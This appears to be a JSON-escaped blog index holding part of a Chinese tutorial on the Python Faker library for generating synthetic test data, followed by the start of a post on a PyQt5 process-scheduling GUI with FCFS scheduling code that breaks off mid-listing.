\u0026#39;https://www.wei.com/terms/\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.url() # url \u0026#39;http://zheng.org/\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.image_url(width=None, height=None) # 图片url \u0026#39;https://www.lorempixel.com/700/990\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.domain_word() # 域名主体 \u0026#39;hu\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.domain_name() # 域名 \u0026#39;hu.cn\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.tld() # 域名后缀 \u0026#39;com\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.user_name() # 用户名 \u0026#39;xia13\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.user_agent() # UA \u0026#39;Opera/8.33.(Windows NT 5.1; an-ES) Presto/2.9.171 Version/10.00\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.mac_address() # MAC地址 \u0026#39;d6:38:cc:2a:76:b2\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.safe_email() # 安全邮箱 \u0026#39;mingli@example.net\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.free_email() # 免费邮箱 \u0026#39;tao44@gmail.com\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.company_email() # 公司邮箱 \u0026#39;jingzhong@wang.cn\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.email() # 邮箱 \u0026#39;changjun@hao.com\u0026#39; job 工作 \u0026gt;\u0026gt;\u0026gt; fake.job()#工作职位 \u0026#39;Dealer\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.job() \u0026#39;Musician\u0026#39; lorem 乱数假文 \u0026gt;\u0026gt;\u0026gt; fake.text(max_nb_chars=200) # 随机生成一篇文章 \u0026#39;语言无法应用为什一点国内.要求完成如何世界电脑发布作品.经济不同教育个人科技全国.\\n在线学生发布信息上海状态.\\n联系一次通过其实介绍世界.增加也是使用成功那个.\\n商品免费管理公司.留言自己这种内容.\\n次数内容知道这样女人感觉.操作他的生产出现如何报告文章只有.\\n个人文化中心不能发布最新.质量一下提高.感觉最大工具表示最后计划.这是还有次数结果其实特别.\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.word() # 随机单词 \u0026#39;能力\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.words(nb=3) # 随机生成几个字 [\u0026#39;国家\u0026#39;, \u0026#39;经营\u0026#39;, \u0026#39;结果\u0026#39;] \u0026gt;\u0026gt;\u0026gt; fake.sentence(nb_words=6, variable_nb_words=True) # 随机生成一个句子 \u0026#39;重要更多我们作品地方增加.\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.sentences(nb=3) # 随机生成几个句子 [\u0026#39;制作上海学生.\u0026#39;, \u0026#39;方式汽车一样技术帮助欢迎.\u0026#39;, \u0026#39;说明一种深圳经营电话帖子.\u0026#39;] \u0026gt;\u0026gt;\u0026gt; fake.paragraph(nb_sentences=3, variable_nb_sentences=True) # 随机生成一段文字(字符串) \u0026#39;非常环境位置有限发展首页行业.情况对于出现部门这种觉得.产品以后因为虽然由于日本不同.\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.paragraphs(nb=3) # 随机生成成几段文字(列表) [\u0026#39;就是发布要求有关这里国际.美国设备深圳经营.首页也是支持报告.\u0026#39;, \u0026#39;决定可是只有发现开始一直.最后有些项目正在深圳关系决定.下载注册图片更多进行他的那些.\u0026#39;, \u0026#39;必须他们发生数据准备联系.同时这样内容学校精华.\u0026#39;] misc 杂项 \u0026gt;\u0026gt;\u0026gt; fake.binary(length=10) # 随机二进制字符串(可指定长度) b\u0026#39;U\\xa9@\\x1e\\x96\\xe7\\xca\\x82\\x14f\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.language_code() # 随机语言代码 \u0026#39;tg\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.md5(raw_output=False) # 随机md5，16进制字符串 \u0026#39;cc4feebe419791332bbcff5e0fdf084a\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.sha1(raw_output=False) # 随机sha1，16进制字符串 \u0026#39;8ac0e9980f880860b6e45ae6fd257cc847b7ae8d\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.sha256(raw_output=False) # 随机sha256，16进制字符串 \u0026#39;033151f173f4a389e38e7df2363d89741f752c474e7bdfa2ee0a794bf0b505b5\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.boolean(chance_of_getting_true=50) # 随机真假值(得到True的几率是50%) False \u0026gt;\u0026gt;\u0026gt; fake.null_boolean() # 随机真假值和null \u0026gt;\u0026gt;\u0026gt; fake.null_boolean() True \u0026gt;\u0026gt;\u0026gt; fake.password(length=10, special_chars=True, digits=True, upper_case=True, lower_case=True) # 随机密码（可指定密码策略） \u0026#39;F%722TJg_U\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.locale() # 随机本地代码 \u0026#39;hy_AM\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.uuid4() # 随机uuid \u0026#39;a50d17e7-bc4f-37a3-27b3-04a24fdd0055\u0026#39; phone_number 电话号码 \u0026gt;\u0026gt;\u0026gt; fake.phone_number() # 手机号码 \u0026#39;13334603608\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.phonenumber_prefix() # 运营商号段，手机号码前三位 158 python数据 \u0026gt;\u0026gt;\u0026gt; fake.pyint() # 随机int 7775 \u0026gt;\u0026gt;\u0026gt; fake.pyfloat(left_digits=None, right_digits=None, positive=False) # 浮点数 -84901.5586333 \u0026gt;\u0026gt;\u0026gt; fake.pydecimal(left_digits=None, right_digits=None, positive=False) # 随机高精度数 Decimal(\u0026#39;-12273687068527.0\u0026#39;) \u0026gt;\u0026gt;\u0026gt; fake.pystr(min_chars=None, max_chars=20) # 随机字符串（可指定长度） \u0026#39;cblutNKFIyegfcHPrjzx\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.pybool() # 随机bool值 True \u0026gt;\u0026gt;\u0026gt; fake.pyiterable(nb_elements=10, variable_nb_elements=True) # 随机iterable [\u0026#39;ODfeVvcbAjPDBGwzljQw\u0026#39;, \u0026#39;https://www.tan.cn/list/category/homepage.php\u0026#39;, \u0026#39;YQlrsFkBieyKYaXlCljJ\u0026#39;, Decimal(\u0026#39;42778240911787.2\u0026#39;), Decimal(\u0026#39;957411812.6383\u0026#39;), \u0026#39;TGbqZufoiUXLQTZDrVcP\u0026#39;, \u0026#39;http://yan.com/posts/tags/search/terms.php\u0026#39;, 3.680492634254, \u0026#39;min57@hotmail.com\u0026#39;, datetime.datetime(2001, 8, 16, 6, 10, 49), \u0026#39;xMMOjlETIgKGqVGTrChG\u0026#39;, \u0026#39;yong83@xu.cn\u0026#39;] \u0026gt;\u0026gt;\u0026gt; fake.pylist(nb_elements=10, variable_nb_elements=True ) # 随机生成一个list [\u0026#39;KXQMXAkcEMSLfnIZkgJb\u0026#39;, \u0026#39;BtowiRsuIqyyULnSYYdr\u0026#39;, datetime.datetime(2011, 10, 10, 14, 44, 2), datetime.datetime(2008, 5, 10, 1, 38, 38), \u0026#39;juan47@hotmail.com\u0026#39;, \u0026#39;QEsdUpEqHLpThyWCjkNx\u0026#39;, Decimal(\u0026#39;-801375867.9\u0026#39;), \u0026#39;ucDyeZnHAXfZtkwdVUbR\u0026#39;, 4707, datetime.datetime(1974, 8, 7, 1, 54, 29)] \u0026gt;\u0026gt;\u0026gt; fake.pydict(nb_elements=10, variable_nb_elements=True) # 随机字典 {\u0026#39;其中\u0026#39;: 9047, \u0026#39;一直\u0026#39;: \u0026#39;AUiUjuqccIdVAWSqzDbW\u0026#39;, \u0026#39;选择\u0026#39;: \u0026#39;ddong@hotmail.com\u0026#39;, \u0026#39;开发\u0026#39;: datetime.datetime(1972, 10, 20, 14, 14, 9), \u0026#39;电影\u0026#39;: \u0026#39;KYmolBhkjSRxloXXFUUT\u0026#39;, \u0026#39;文化\u0026#39;: 2681, \u0026#39;这里\u0026#39;: \u0026#39;uyang@yahoo.com\u0026#39;, \u0026#39;不会\u0026#39;: \u0026#39;ZPkwuxWsrJSHMNuFiWEx\u0026#39;, \u0026#39;社会\u0026#39;: \u0026#39;CiujeaZMZSuyYwuKzEdN\u0026#39;} \u0026gt;\u0026gt;\u0026gt; fake.pyset(nb_elements=10, variable_nb_elements=True) # 随机set {\u0026#39;bhe@hotmail.com\u0026#39;, \u0026#39;http://fu.cn/list/home.htm\u0026#39;, \u0026#39;MlJluVirRkofBnKNtphM\u0026#39;, 296, \u0026#39;ghoUSHkuEGmCzlJFKyHZ\u0026#39;, datetime.datetime(2008, 4, 4, 2, 55, 4), \u0026#39;AgbynHjdvwYpUkbMsfqr\u0026#39;, 8751, 9649, \u0026#39;tangguiying@hotmail.com\u0026#39;, Decimal(\u0026#39;5727570036.91\u0026#39;), \u0026#39;HmDkExndcQIOaTtsSpsc\u0026#39;, \u0026#39;hjQlLLXuHVVzENEwoHJK\u0026#39;} \u0026gt;\u0026gt;\u0026gt; fake.pytuple(nb_elements=10, variable_nb_elements=True) # 随机tuple (\u0026#39;http://www.cai.com/index/\u0026#39;, datetime.datetime(1973, 7, 28, 2, 12, 23), \u0026#39;khltJQMYJvIDRMYodviZ\u0026#39;, \u0026#39;uJezUsEqiHaiFxwOPWvl\u0026#39;, \u0026#39;qojwZHyytBSQQavkDaTu\u0026#39;, \u0026#39;AHUCHYuVJTHnoSEuQDSY\u0026#39;, 1012, \u0026#39;uEYVuzeTlgVhrnCATfKw\u0026#39;, \u0026#39;https://www.zhou.com/categories/tags/main/\u0026#39;, \u0026#39;LbLSFZPeATtzHvbmYhGr\u0026#39;) \u0026gt;\u0026gt;\u0026gt; fake.pystruct() # 随机生成3个有10个元素的python数据结构 ([datetime.datetime(1996, 10, 26, 7, 35, 26), datetime.datetime(1998, 2, 28, 17, 20, 8), \u0026#39;qianming@hotmail.com\u0026#39;, \u0026#39;yEWMrpTqtAHfbxqldGrb\u0026#39;, \u0026#39;YgKYOnrjuthOrOXhlYIl\u0026#39;, datetime.datetime(1994, 12, 10, 0, 55, 30), Decimal(\u0026#39;-6865068.3\u0026#39;), \u0026#39;SYHFHiFvJlRVPcCKumUM\u0026#39;, -8619.4354, \u0026#39;kwGipwcASeALLeKdaWBi\u0026#39;], {\u0026#39;同时\u0026#39;: \u0026#39;BvtYdkNTHwZNMiIIRwKd\u0026#39;, \u0026#39;空间\u0026#39;: 310959668662.457, \u0026#39;特别\u0026#39;: \u0026#39;PZQDBuuQWkcdryMloyKS\u0026#39;, \u0026#39;音乐\u0026#39;: Decimal(\u0026#39;-7219015925.0\u0026#39;), \u0026#39;项目\u0026#39;: \u0026#39;https://www.zhou.cn/main.php\u0026#39;, \u0026#39;回复\u0026#39;: 30.408750841, \u0026#39;显示\u0026#39;: \u0026#39;etZMrsjXJgZpDfZWhpoS\u0026#39;, \u0026#39;大小\u0026#39;: 7472, \u0026#39;类型\u0026#39;: \u0026#39;OsjpxgLqnTcdVOlHoMoP\u0026#39;, \u0026#39;什么\u0026#39;: \u0026#39;http://www.xia.com/posts/app/index/\u0026#39;}, {\u0026#39;朋友\u0026#39;: {0: -415025.243093017, 1: [1799, 585, \u0026#39;shu@hotmail.com\u0026#39;], 2: {0: 9980, 1: \u0026#39;qnOnFTzGnsjvXGybBnMF\u0026#39;, 2: [\u0026#39;http://zheng.cn/list/search/tag/faq.html\u0026#39;, Decimal(\u0026#39;964285276661463.0\u0026#39;)]}}, \u0026#39;发生\u0026#39;: {1: -5339010.6134, 2: [datetime.datetime(1987, 6, 23, 15, 21, 45), \u0026#39;SvSpvKqTXlJvdQhHScwM\u0026#39;, \u0026#39;PZjKOYzZzoNVsHLRcARQ\u0026#39;], 3: {1: \u0026#39;https://www.yan.cn/register/\u0026#39;, 2: 2191, 3: [\u0026#39;HMHKQuLRBQaaAypRbtHU\u0026#39;, datetime.datetime(2014, 5, 24, 3, 32, 36)]}}, \u0026#39;我的\u0026#39;: {2: \u0026#39;linxia@yahoo.com\u0026#39;, 3: [\u0026#39;http://gu.com/about.php\u0026#39;, \u0026#39;DhzpWYkgLCobGSHDLXzI\u0026#39;, 1420], 4: {2: datetime.datetime(1986, 2, 22, 4, 50, 12), 3: \u0026#39;rRHwQQzkpAMBQxwVITBa\u0026#39;, 4: [datetime.datetime(1984, 2, 6, 11, 52, 18), -73821572962388.7]}}, \u0026#39;全部\u0026#39;: {3: \u0026#39;uMQeeBXYNGhrHnAerdjp\u0026#39;, 4: [323329.56403, \u0026#39;kFvqXFhhtQPNtrOjKtxa\u0026#39;, \u0026#39;http://peng.cn/\u0026#39;], 5: {3: \u0026#39;lcaoeisYIAOsuRjbOXia\u0026#39;, 4: Decimal(\u0026#39;-902407032449085.0\u0026#39;), 5: [2296, \u0026#39;uyuWgnsONzLluXqXdASM\u0026#39;]}}, \u0026#39;大小\u0026#39;: {4: \u0026#39;min63@hotmail.com\u0026#39;, 5: [datetime.datetime(1991, 10, 22, 19, 21, 48), \u0026#39;cDYEScdIokWuvGhRkWqs\u0026#39;, \u0026#39;XeDJojWyywFvzmWYaokO\u0026#39;], 6: {4: Decimal(\u0026#39;-4167029.2915827\u0026#39;), 5: 4030, 6: [6372, \u0026#39;xfRXXEFGsNQpeIGmbaHU\u0026#39;]}}, \u0026#39;语言\u0026#39;: {5: \u0026#39;https://www.guo.cn/\u0026#39;, 6: [6498, datetime.datetime(1981, 12, 3, 18, 4, 29), 42598100345.61], 7: {5: \u0026#39;http://zheng.cn/\u0026#39;, 6: -229316.268238, 7: [\u0026#39;https://www.qiao.cn/home/\u0026#39;, \u0026#39;GtaEXeVxjRnnkggjEguv\u0026#39;]}}, \u0026#39;表示\u0026#39;: {6: \u0026#39;xcBvcGUWxdMhDqgzmhSd\u0026#39;, 7: [\u0026#39;kwDaFhyTKqHajGSaNOMf\u0026#39;, 8561, 5456], 8: {6: \u0026#39;https://zhou.cn/tags/tag/faq.html\u0026#39;, 7: \u0026#39;IGayAZtTQVlSOasQwgug\u0026#39;, 8: [\u0026#39;iCjwBzHfmPSLqAgmIOle\u0026#39;, 70511766106574.5]}}, \u0026#39;电子\u0026#39;: {7: \u0026#39;http://www.lu.org/tags/posts/terms/\u0026#39;, 8: [datetime.datetime(1978, 8, 11, 12, 16, 35), \u0026#39;https://song.cn/main/categories/homepage.html\u0026#39;, \u0026#39;https://long.com/register.html\u0026#39;], 9: {7: \u0026#39;nFJNhyMYBvfTxrYwYPUQ\u0026#39;, 8: -2252757903.0, 9: [\u0026#39;GuJnhMEgXoMAivrgGZie\u0026#39;, datetime.datetime(2014, 5, 29, 1, 17, 50)]}}, \u0026#39;的人\u0026#39;: {8: \u0026#39;WgHePwYSPgSiPllXpLlJ\u0026#39;, 9: [1782, \u0026#39;fSepbXwpvhiBphzDTDNC\u0026#39;, -9117731.63459416], 10: {8: 5602, 9: 3664, 10: [\u0026#39;http://www.mao.com/search/tag/main/\u0026#39;, Decimal(\u0026#39;5579.7377\u0026#39;)]}}, \u0026#39;不过\u0026#39;: {9: \u0026#39;rOfkDPTHvzKbfvQHbPNm\u0026#39;, 10: [314.397, \u0026#39;StqeLyXkIDKHfExSjggk\u0026#39;, \u0026#39;xiuyingkang@gao.cn\u0026#39;], 11: {9: \u0026#39;BLKNdcccamYzBwRcMxlx\u0026#39;, 10: \u0026#39;yongduan@gong.org\u0026#39;, 11: [\u0026#39;ZocoQHdbhaNloWALnzwt\u0026#39;, \u0026#39;eWVvvHurAlZZRxlYHZXi\u0026#39;]}}}) profile 人物描述信息 \u0026gt;\u0026gt;\u0026gt; fake.profile(fields=None, sex=None) # 人物描述信息：姓名、性别、地址、公司等 {\u0026#39;job\u0026#39;: \u0026#39;Licensed conveyancer\u0026#39;, \u0026#39;company\u0026#39;: \u0026#39;万迅电脑信息有限公司\u0026#39;, \u0026#39;ssn\u0026#39;: \u0026#39;370684199902182726\u0026#39;, \u0026#39;residence\u0026#39;: \u0026#39;福建省小红市南长广州街K座 406448\u0026#39;, \u0026#39;current_location\u0026#39;: (Decimal(\u0026#39;18.050895\u0026#39;), Decimal(\u0026#39;-0.877117\u0026#39;)), \u0026#39;blood_group\u0026#39;: \u0026#39;0-\u0026#39;, \u0026#39;website\u0026#39;: [\u0026#39;https://www.yi.org/\u0026#39;, \u0026#39;https://www.hu.com/\u0026#39;, \u0026#39;https://www.yin.cn/\u0026#39;], \u0026#39;username\u0026#39;: \u0026#39;minghuang\u0026#39;, \u0026#39;name\u0026#39;: \u0026#39;后英\u0026#39;, \u0026#39;sex\u0026#39;: \u0026#39;F\u0026#39;, \u0026#39;address\u0026#39;: \u0026#39;安徽省秀荣市璧山嘉禾路T座 954960\u0026#39;, \u0026#39;mail\u0026#39;: \u0026#39;czhong@hotmail.com\u0026#39;, \u0026#39;birthdate\u0026#39;: \u0026#39;1975-03-09\u0026#39;} \u0026gt;\u0026gt;\u0026gt; s = fake.simple_profile(sex=\u0026#34;m\u0026#34;) # 人物精简信息 \u0026gt;\u0026gt;\u0026gt; for i,v in s.items(): ... print(i,v) ... username chao85 name 邴宇 sex M address 陕西省东市朝阳廖街Y座 757661 mail xiazhang@gmail.com birthdate 1996-09-20 ssn 社会安全码(身份证) \u0026gt;\u0026gt;\u0026gt; fake.ssn() # 随机生成身份证号(18位) \u0026#39;140100196612297997\u0026#39; \u0026gt;\u0026gt;\u0026gt; len(fake.ssn()) 18 user_agent 用户代理 \u0026gt;\u0026gt;\u0026gt; fake.user_agent() # 伪造UA \u0026#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/5361 (KHTML, like Gecko) Chrome/15.0.812.0 Safari/5361\u0026#39; 平台信息伪造 \u0026gt;\u0026gt;\u0026gt; fake.linux_platform_token() \u0026#39;X11; Linux i686\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.linux_processor() \u0026#39;i686\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.windows_platform_token() \u0026#39;Windows CE\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.mac_platform_token() \u0026#39;Macintosh; Intel Mac OS X 10_7_4\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.mac_processor() \u0026#39;PPC\u0026#39; 浏览器伪造 \u0026gt;\u0026gt;\u0026gt; fake.internet_explorer() # IE浏览器 \u0026#39;Mozilla/5.0 (compatible; MSIE 5.0; Windows NT 6.1; Trident/4.0)\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.opera() # opera浏览器 \u0026#39;Opera/9.37.(Windows 95; doi-IN) Presto/2.9.178 Version/10.00\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.firefox() # firefox浏览器 \u0026#39;Mozilla/5.0 (Windows NT 5.0; te-IN; rv:1.9.2.20) Gecko/2015-09-28 13:29:05 Firefox/12.0\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.safari() # safari浏览器 \u0026#39;Mozilla/5.0 (Windows; U; Windows NT 4.0) AppleWebKit/533.37.4 (KHTML, like Gecko) Version/5.0 Safari/533.37.4\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.chrome() # chrome浏览器 \u0026#39;Mozilla/5.0 (Windows 98; Win 9x 4.90) AppleWebKit/5361 (KHTML, like Gecko) Chrome/14.0.866.0 Safari/5361\u0026#39; 自定义扩展 Faker 已经提供了足够丰富的信息生成，包括名字、手机号、邮箱地址、邮编等等。尽管如此，可能还是没有办法满足你的需求。这时，可以利用自定义扩展，引用外部的 provider，自定义你要的功能。\nFaker 对象可以通过 add_provider 方法将自定义的 Provider 添加到对象中,自定义的 Provider 需要继承自 BaseProvider。\nfrom faker import Faker fake = Faker() # first, import a similar Provider or use the default one from faker.providers import BaseProvider # create new provider class class MyProvider(BaseProvider): def foo(self): return \u0026#39;bar\u0026#39; # then add new provider to faker instance fake.add_provider(MyProvider) # now you can use: print(fake.foo()) 结果显示：\nbar 随机控制 Faker 随机生成由 random.Random 驱动。其中，.random 属性返回 random.Random 对象。通过对该对象的操作，可以实现自定义的行为。\nfrom faker import Faker fake = Faker() fake.random fake.random.getstate() 那么，可以实现什么自定义呢？举个例子，我们可以设置 seed，通过给定的 seed 可以控制每次生成的内容都是一样的。\n\u0026gt;\u0026gt;\u0026gt; from faker import Faker \u0026gt;\u0026gt;\u0026gt; fake = Faker() \u0026gt;\u0026gt;\u0026gt; fake.random.seed(4321) \u0026gt;\u0026gt;\u0026gt; fake.name() \u0026#39;Ryan Gallagher\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.address() \u0026#39;7631 Johnson Village Suite 690\\nAdamsbury, NC 50008\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.random.seed(4321) \u0026gt;\u0026gt;\u0026gt; fake.name() \u0026#39;Ryan Gallagher\u0026#39; \u0026gt;\u0026gt;\u0026gt; fake.address() \u0026#39;7631 Johnson Village Suite 690\\nAdamsbury, NC 50008\u0026#39; 不同的两次运行，只要seed一样，生成出来的信息就是一样的。\n注意：fake.random.seed(4321) 可以写成 fake.seed(4321) 。\n命令行生成 有时想在shell或者其他程序中生成一些伪数据，是不是一定要写一个Python脚本呢？别急——Faker提供了一个命令行工具，估计可以应对大部分场景了：\n$ faker address 968 Bahringer Garden Apt. 722Kristinaland, NJ 09890 $ python3 -m faker address 432 Marvin Wells Apt. 593\\nWest Eric, DC 45650-8420 $ faker -l de_DE address Samira-Niemeier-Allee 5694812 Biedenkopf $ faker profile {\u0026#39;job\u0026#39;: \u0026#39;Designer, blown glass/stained glass\u0026#39;, \u0026#39;company\u0026#39;: \u0026#39;Dennis-Bowers\u0026#39;, \u0026#39;ssn\u0026#39;: \u0026#39;034-28-9965\u0026#39;, \u0026#39;residence\u0026#39;: \u0026#39;34796 Jeremiah Station Apt. 782\\nWest Timothy, TX 24139-6974\u0026#39;, \u0026#39;current_location\u0026#39;: (Decimal(\u0026#39;-47.425017\u0026#39;), Decimal(\u0026#39;-42.743615\u0026#39;)), \u0026#39;blood_group\u0026#39;: \u0026#39;0+\u0026#39;, \u0026#39;website\u0026#39;: [\u0026#39;https://www.gardner.biz/\u0026#39;, \u0026#39;http://glover-ellison.info/\u0026#39;, \u0026#39;http://www.harrison.biz/\u0026#39;], \u0026#39;username\u0026#39;: \u0026#39;patrick33\u0026#39;, \u0026#39;name\u0026#39;: \u0026#39;Alexandra Montgomery\u0026#39;, \u0026#39;sex\u0026#39;: \u0026#39;F\u0026#39;, \u0026#39;address\u0026#39;: \u0026#39;2314 Collier Stream Suite 093\\nMcintyreside, UT 19553\u0026#39;, \u0026#39;mail\u0026#39;: \u0026#39;gomezterri@hotmail.com\u0026#39;, \u0026#39;birthdate\u0026#39;: \u0026#39;2005-01-30\u0026#39;} $ faker profile ssn,name {\u0026#39;ssn\u0026#39;: \u0026#39;344-68-7420\u0026#39;, \u0026#39;name\u0026#39;: \u0026#39;Veronica Brennan\u0026#39;} $ faker -r=3 -s=\u0026#34;;\u0026#34; name Willam Kertzmann; Josiah Maggio; Gayla Schmitt; faker 命令帮助：\nfaker [-h] [--version] [-o output] [-l {bg_BG,cs_CZ,...,zh_CN,zh_TW}] [-r REPEAT] [-s SEP] [-i {module.containing.custom_provider othermodule.containing.custom_provider}] [fake] [fake argument [fake argument ...]] 选项说明：\nfaker ： 在shell中，faker 命令也可以用 python -m faker 来代替 -h，--help ： 帮助信息 --version ：显示版本 -o FILENAM ：输出结果到文件中 -l {bg_BG,cs_CZ,...,zh_CN,zh_TW} ：指定本地化，zh_CN 表示中文 -r REPEAT ：指定生成多少条相同类型的数据 -s SEP ：在每个输出后边添加指定的分隔符 -i {my.custom_provider other.custom_provider} ：自定义扩展，prividers列表。注意，这里要指定包含你 provider 类的模块的路径，而不是程序本身。 fake ：指定方法名称，如：name , address , text 等 [fake argument ...] ：为方法指定参数。如上例，为 profile 方法指定 ssn 和 name 参数，只输出这两个类型的内容。 ","date":"2019-03-14T12:29:45+08:00","permalink":"https://lizonglingo.github.io/p/python%E4%BC%AA%E9%80%A0%E6%95%B0%E6%8D%AE%E7%94%9F%E6%88%90%E5%99%A8faker/","title":"Python伪造数据生成器：Faker"},{"content":"处理机调度图形界面1.0版本 我一直觉得我效率很低\u0026hellip;但还是画出来了，用的PyQt5这个库做的简陋界面，很多功能缺失\u0026hellip;算法残疾\u0026hellip;\n这篇博文以一个算法实例来说一下大体思路\n代码 思路 演示 不足 改进 对了我给搞上评论系统辽，虽然这人迹罕至，但俺还是希望阴差阳错戳进来的朋友可以互动一哈 惯例先给代码好吧 以最简单的FCFS算法为例子，总代码量可能有1000行左右\n这个算法的代码比较短\nfrom PyQt5.QtWidgets import (QWidget,QLineEdit,QHBoxLayout,QTableWidget,QPushButton,QApplication,QVBoxLayout,QTableWidgetItem, QCheckBox,QAbstractItemView,QHeaderView,QLabel,QFrame) from PyQt5 import QtWidgets, QtCore from PyQt5.QtCore import Qt from builtins import super, str, range from PyQt5.QtGui import QFont,QColor from faker import Factory import random, sys, operator # 引入数据结构 # 定义每个进程基本数据结构 class Process: def __init__(self, name, arrive_time, serve_time, static_class, ready=False, over=False): self.name = name # 进程名称 self.arrive_time = arrive_time # 到达时间 self.serve_time = serve_time # 服务时间 self.left_serve_time = serve_time # 剩余需要服务的时间 self.finish_time = 0 # 完成时间 self.cycling_time = 0 # 周转时间 self.w_cycling_time = 0 # 带权周转时间 self.response_ratio = 0 # 响应比 self.pre_queue = 0 # 定义现在所在的队列 self.pre_queue_tb = 0 # 目前所在队列的时间片 self.used_time = 0 # 已经使用的时间，也就是（服务时间 - 剩余\t服务时间） self.ready = ready # 记录就绪状态 self.over = over # 记录完成状态 self.static_class = static_class # 人为赋予静态优先级 # 现来先服务作业调度算法 def fcfs(processes): # 到达时间小的优先 sum_cycling_time = 0 sum_w_cycling_time = 0 number = len(processes) over_list = [] min_key = 0 fin_name = [] name_string = \u0026#39;\u0026#39; time_string = \u0026#39;带权周转时间：\u0026#39; last_infor = [] running_time = 0 while processes: min = processes[0].arrive_time for i in range(len(processes)): if processes[i].arrive_time \u0026lt;= min: min = processes[i].arrive_time min_key = i running_time += processes[min_key].serve_time # 计算相关参数 processes[min_key].cycling_time = running_time - processes[min_key].arrive_time processes[min_key].w_cycling_time = processes[min_key].cycling_time / processes[min_key].serve_time sum_cycling_time += processes[min_key].cycling_time sum_w_cycling_time += processes[min_key].w_cycling_time over_list.append(processes.pop(min_key)) for i in range(len(over_list)): print(over_list[i].name) name_string += (over_list[i].name+\u0026#39; \u0026#39;) fin_name.append(over_list[i].name) a_c_time = sum_cycling_time/number a_w_c_time = sum_w_cycling_time/number print(\u0026#39;平均周转时间：\u0026#39; + str(a_c_time)) print(\u0026#39;平均带权周转时间：\u0026#39; + str(a_w_c_time/number)) time_string += (str(a_c_time) + \u0026#39; 平均带权周转时间：\u0026#39; + str(a_w_c_time)) last_infor.append(name_string) last_infor.append(time_string) # return fin_name return last_infor class ui(QWidget): def __init__(self): super(ui, self).__init__() self.setupUI() self.id = 1 self.lines = [] self.editable = True self.des_sort = True self.faker = Factory.create() self.btn_add.clicked.connect(self.add_line) self.btn_del.clicked.connect(self.del_line) self.btn_modify.clicked.connect(self.modify_line) self.btn_set_middle.clicked.connect(self.middle) self.btn_get_info.clicked.connect(self.g_info) self.table.cellChanged.connect(self.cellchange) global original_processes # 这里我们定义全局变量 - 原始进程列表，是一个二维列表 def setupUI(self): self.setWindowTitle(\u0026#39;数据测试\u0026#39;) self.resize(720,420) self.table = QTableWidget(self) self.btn_add = QPushButton(\u0026#39;增加\u0026#39;) self.btn_del = QPushButton(\u0026#39;删除\u0026#39;) self.btn_modify = QPushButton(\u0026#39;可以编辑\u0026#39;) self.btn_set_middle = QPushButton(\u0026#39;文字居中\u0026#39;) self.btn_get_info = QPushButton(\u0026#39;生成调度序列\u0026#39;) # 弹簧控件 self.spacerItem = QtWidgets.QSpacerItem(20, 20, QtWidgets.QSizePolicy.Minimum, QtWidgets.QSizePolicy.Expanding) # 垂直布局，使用嵌套布局方式 # 我们把所有按钮按照盒布局-垂直布局方式，构成嵌套布局的一个块 # 按照设置的方式依此从上到下 self.vbox = QVBoxLayout() self.vbox.addWidget(self.btn_add) self.vbox.addWidget(self.btn_del) self.vbox.addWidget(self.btn_modify) self.vbox.addWidget(self.btn_set_middle) self.vbox.addWidget(self.btn_get_info) self.vbox.addSpacerItem(self.spacerItem) self.txt = QLabel() # 这是进行操作时显示在最左下角的提示信息 self.txt.setMinimumHeight(50) # 限定控件大小 self.lab_over = QLabel(\u0026#39;调度顺序\u0026#39;) # 输出队列顺序 self.lab_over.setMinimumHeight(20) self.over_Edit = QLineEdit(self) self.over_Edit.setMinimumHeight(25) self.lab_time = QLabel(\u0026#39;平均周转时间和平均带权周转时间\u0026#39;) self.avrtime_edit = QLineEdit(self) # 垂直布局 # 把表格和下面的操作提示文本信息按照垂直布局设置，作为嵌套布局方式的另一部分 self.vbox2 = QVBoxLayout() self.vbox2.addWidget(self.table) # 将表格和下面的操作提示放入垂直布局，先放表格 self.vbox2.addWidget(self.lab_over) # 放输出队列 self.vbox2.addWidget(self.over_Edit) self.vbox2.addWidget(self.lab_time) self.vbox2.addWidget(self.avrtime_edit) self.vbox2.addWidget(self.txt) # 再放文本框 # 水平布局 # 这是将上述两个布局方式作为整体布局的元素，vbox和vbox2共同放入水平布局 self.hbox = QHBoxLayout() self.hbox.addLayout(self.vbox2) # 将这样就会自左向右，先放表格， self.hbox.addLayout(self.vbox) # 再放按钮 # 将水平布局放入总体布局 self.setLayout(self.hbox) # 表格基本属性设置 self.table.setColumnCount(6) # 设置列数 self.table.horizontalHeader().setDefaultAlignment(QtCore.Qt.AlignCenter) self.headers = [\u0026#39;ID\u0026#39;,\u0026#39;选择\u0026#39;,\u0026#39;进程名\u0026#39;, 